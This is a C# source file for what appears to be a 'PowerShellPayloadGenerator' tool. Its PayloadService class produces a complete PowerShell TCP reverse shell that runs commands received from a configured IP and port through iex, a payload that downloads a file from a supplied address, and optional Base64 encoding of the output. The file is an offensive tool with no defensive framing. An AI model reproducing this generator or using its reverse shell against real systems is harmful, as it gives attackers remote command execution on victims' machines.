using System;
using System.Text;
using PowerShellPayloadGenerator.Models;
using PowerShellPayloadGenerator.Utilities;

namespace PowerShellPayloadGenerator.Services
{
    public class PayloadService
    {
        public string GeneratePayload(PayloadConfig config)
        {
            ValidateConfig(config);
            
            string payload = config.Type.ToLower() switch
            {
                "reverseshell" => GenerateReverseShell(config),
                "download" => GenerateDownloadPayload(config),
                "command" => GenerateCommandPayload(config),
                _ => throw new ArgumentException($"Unknown payload type: {config.Type}")
            };

            if (config.Encode)
            {
                payload = SecurityHelper.EncodeBase64(payload);
            }

            if (config.Validate)
            {
                ValidatePowerShellSyntax(payload);
            }

            return payload;
        }

        private string GenerateReverseShell(PayloadConfig config)
        {
            return $@"$client = New-Object System.Net.Sockets.TCPClient('{config.IpAddress}',{config.Port});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}}
$client.Close();";
        }

        private string GenerateDownloadPayload(PayloadConfig config)
        {
            return $@"(New-Object System.Net.WebClient).DownloadFile('{config.IpAddress}', 'downloaded.file');
Write-Host 'File downloaded'";
        }

        private string GenerateCommandPayload(PayloadConfig config)
        {
            return $@"Get-Process | Select-Object Name, CPU | Format-Table";
        }

        private void ValidateConfig(PayloadConfig config)
        {
            if (string.IsNullOrEmpty(config.Type))
                throw new ArgumentException("Payload type is required");
            
            if (config.Type == "ReverseShell" || config.Type == "Download")
            {
                if (string.IsNullOrEmpty(config.IpAddress))
                    throw new ArgumentException("IP address is required for this payload type");
                
                if (config.Port <= 0 || config.Port > 65535)
                    throw new ArgumentException("Invalid port number");
            }
        }

        private void ValidatePowerShellSyntax(string payload)
        {
            // Basic syntax validation
            if (payload.Contains("Remove-Item") && payload.Contains("-Recurse") && payload.Contains("-Force"))
            {
                Console.WriteLine("[WARNING] Payload contains potentially dangerous operations");
            }
        }
    }
}
